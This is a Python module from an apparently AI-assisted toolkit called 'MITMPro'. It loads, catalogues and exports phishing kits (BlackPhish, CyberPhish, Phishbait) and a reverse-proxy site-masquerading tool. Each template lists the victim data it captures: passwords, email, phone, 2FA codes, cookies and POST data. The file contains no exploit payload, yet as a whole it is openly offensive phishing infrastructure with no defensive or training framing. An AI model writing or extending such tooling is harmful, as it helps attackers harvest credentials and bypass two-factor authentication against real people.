"""
MITMPro - Phishing Template Engine
Integrates BlackPhish, CyberPhish, and Phishbait templates
"""

import os
import json
import shutil
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum


class PhishingTemplateSource(Enum):
    """Sources of phishing templates"""
    BLACKPHISH = "blackphish"
    CYBERPHISH = "cyberphish"
    PHISHBAIT = "phishbait"
    POC_MASQUERADING = "poc_masquerading"


@dataclass
class PhishingTemplate:
    """Represents a phishing template"""
    name: str
    source: PhishingTemplateSource
    path: str
    category: str = "social_media"
    fields: List[str] = field(default_factory=list)
    description: str = ""
    capture_fields: List[str] = field(default_factory=list)


class PhishingTemplateEngine:
    """Engine for managing all phishing templates"""
    
    def __init__(self, base_path: str = "/home/dfat/Downloads/MITM_PRO_AI"):
        self.base_path = base_path
        self.templates: List[PhishingTemplate] = []
        self.categories: Dict[str, List[PhishingTemplate]] = {}
        self._load_templates()
    
    def _load_templates(self):
        """Load all phishing templates from all sources"""
        self._load_blackphish()
        self._load_cyberphish()
        self._load_phishbait()
        self._load_poc_masquerading()
        self._build_categories()
    
    def _load_blackphish(self):
        """Load BlackPhish templates"""
        path = os.path.join(self.base_path, "KPHISH_AI", "BlackPhish-master", "Websites")
        if os.path.exists(path):
            for name in os.listdir(path):
                template_path = os.path.join(path, name)
                if os.path.isdir(template_path):
                    self.templates.append(PhishingTemplate(
                        name=name,
                        source=PhishingTemplateSource.BLACKPHISH,
                        path=template_path,
                        category="social_media",
                        description=f"BlackPhish template for {name}",
                        fields=["username", "password"],
                        capture_fields=["username", "password"]
                    ))
    
    def _load_cyberphish(self):
        """Load CyberPhish templates"""
        # CyberPhish uses Python-based email templates
        core_path = os.path.join(self.base_path, "KPHISH_AI", "CyberPhish-master", "Core", "eletter")
        if os.path.exists(core_path):
            for file in os.listdir(core_path):
                if file.endswith(".py") and file[0].isupper():
                    template_name = file.replace(".py", "")
                    self.templates.append(PhishingTemplate(
                        name=f"CyberPhish-{template_name}",
                        source=PhishingTemplateSource.CYBERPHISH,
                        path=os.path.join(core_path, file),
                        category="email_template",
                        description=f"CyberPhish email template for {template_name}",
                        fields=["subject", "from_name", "body"],
                        capture_fields=["credentials"]
                    ))
    
    def _load_phishbait(self):
        """Load Phishbait templates"""
        path = os.path.join(self.base_path, "KPHISH_AI", "Phishbait-main", "Websites")
        if os.path.exists(path):
            for name in os.listdir(path):
                template_path = os.path.join(path, name)
                if os.path.isdir(template_path):
                    self.templates.append(PhishingTemplate(
                        name=name,
                        source=PhishingTemplateSource.PHISHBAIT,
                        path=template_path,
                        category="brand_impersonation",
                        description=f"Phishbait brand template for {name}",
                        fields=["email", "password", "phone"],
                        capture_fields=["email", "password", "2fa_code"]
                    ))
    
    def _load_poc_masquerading(self):
        """Load PoC Website Masquerading templates"""
        path = os.path.join(self.base_path, "mitm_tools", "PoC-Website-Masquerading-main")
        if os.path.exists(path):
            self.templates.append(PhishingTemplate(
                name="PoC-Masquerading-Server",
                source=PhishingTemplateSource.POC_MASQUERADING,
                path=path,
                category="reverse_proxy",
                description="PoC Website Masquerading reverse proxy - mirrors target site in real-time",
                fields=["target_url"],
                capture_fields=["post_data", "cookies"]
            ))
    
    def _build_categories(self):
        """Build category index"""
        self.categories = {}
        for template in self.templates:
            if template.category not in self.categories:
                self.categories[template.category] = []
            self.categories[template.category].append(template)
    
    def get_templates_by_source(self, source: PhishingTemplateSource) -> List[PhishingTemplate]:
        """Get templates from a specific source"""
        return [t for t in self.templates if t.source == source]
    
    def get_templates_by_category(self, category: str) -> List[PhishingTemplate]:
        """Get templates by category"""
        return self.categories.get(category, [])
    
    def get_template(self, name: str) -> Optional[PhishingTemplate]:
        """Get template by name"""
        for t in self.templates:
            if t.name == name:
                return t
        return None
    
    def search_templates(self, query: str) -> List[PhishingTemplate]:
        """Search templates by name"""
        query = query.lower()
        return [t for t in self.templates if query in t.name.lower() or query in t.description.lower()]
    
    def get_template_stats(self) -> Dict:
        """Get template statistics"""
        stats = {
            "total": len(self.templates),
            "by_source": {},
            "by_category": {},
            "capture_fields": set()
        }
        
        for t in self.templates:
            src = t.source.value
            stats["by_source"][src] = stats["by_source"].get(src, 0) + 1
            stats["by_category"][t.category] = stats["by_category"].get(t.category, 0) + 1
            stats["capture_fields"].update(t.capture_fields)
        
        stats["capture_fields"] = list(stats["capture_fields"])
        return stats
    
    def export_template(self, name: str, output_path: str) -> bool:
        """Export a template to a directory"""
        template = self.get_template(name)
        if template and os.path.isdir(template.path):
            shutil.copytree(template.path, output_path, dirs_exist_ok=True)
            return True
        elif template and os.path.isfile(template.path):
            shutil.copy(template.path, output_path)
            return True
        return False
    
    def get_all_templates(self) -> List[Dict]:
        """Get all templates as dicts"""
        return [
            {
                "name": t.name,
                "source": t.source.value,
                "path": t.path,
                "category": t.category,
                "description": t.description,
                "fields": t.fields,
                "capture_fields": t.capture_fields
            }
            for t in self.templates
        ]


# Global engine instance
_phishing_engine = None

def get_phishing_engine(base_path: str = None) -> PhishingTemplateEngine:
    """Get or create the global phishing engine"""
    global _phishing_engine
    if _phishing_engine is None:
        _phishing_engine = PhishingTemplateEngine(base_path or "/home/dfat/Downloads/MITM_PRO_AI")
    return _phishing_engine


if __name__ == "__main__":
    engine = get_phishing_engine()
    stats = engine.get_template_stats()
    print(f"Total templates: {stats['total']}")
    print(f"By source: {stats['by_source']}")
    print(f"By category: {stats['by_category']}")
    print(f"Capture fields: {stats['capture_fields']}")